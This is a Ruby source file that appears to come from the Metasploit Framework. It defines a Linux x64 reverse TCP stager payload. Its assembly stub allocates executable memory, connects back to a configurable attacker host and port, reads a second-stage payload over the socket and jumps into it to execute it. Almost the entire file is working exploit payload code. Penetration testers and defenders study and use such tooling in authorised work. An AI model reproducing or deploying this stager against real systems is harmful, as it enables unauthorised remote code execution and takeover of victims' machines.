# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/linux'

module Msf


###
#
# Complex reverse TCP payload generation for Linux ARCH_X64
#
###


module Payload::Linux::ReverseTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Linux

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    asm = asm_reverse_tcp(opts)
    buf = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
    apply_prepends(buf)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = 300

    # Reliability adds 10 bytes for recv error checks
    space += 10

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :host The host IP to connect to
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_tcp(opts={})
    # TODO: reliability is coming
    retry_count  = [opts[:retry_count].to_i, 1].max
    reliable     = opts[:reliable]
    encoded_port = "%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
    encoded_host = "%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first

    asm = %Q^
        xor    rdi, rdi
        push   0x9
        pop    rax
        cdq
        mov    dh, 0x10
        mov    rsi, rdx
        xor    r9, r9
        push   0x22
        pop    r10
        mov    dl, 0x7
        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
        test   rax, rax
        js failed

        push   rsi
        push   rax
        push   0x29
        pop    rax
        cdq
        push   0x2
        pop    rdi
        push   0x1
        pop    rsi
        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
        test   rax, rax
        js failed

        xchg   rdi, rax
        mov    rcx, 0x#{encoded_host}#{encoded_port}
        push   rcx
        mov    rsi, rsp
        push   0x10
        pop    rdx
        push   0x2a
        pop    rax
        syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
        test   rax, rax
        js     failed

        pop    rcx
        pop    rsi
        pop    rdx
        syscall	; read(3, "", 4096)
        test   rax, rax
        js     failed

        jmp    rsi ; to stage

      failed:
        push   0x3c
        pop    rax
        push   0x1
        pop    rdi
        syscall ; exit(1)
    ^

    asm
  end

end

end
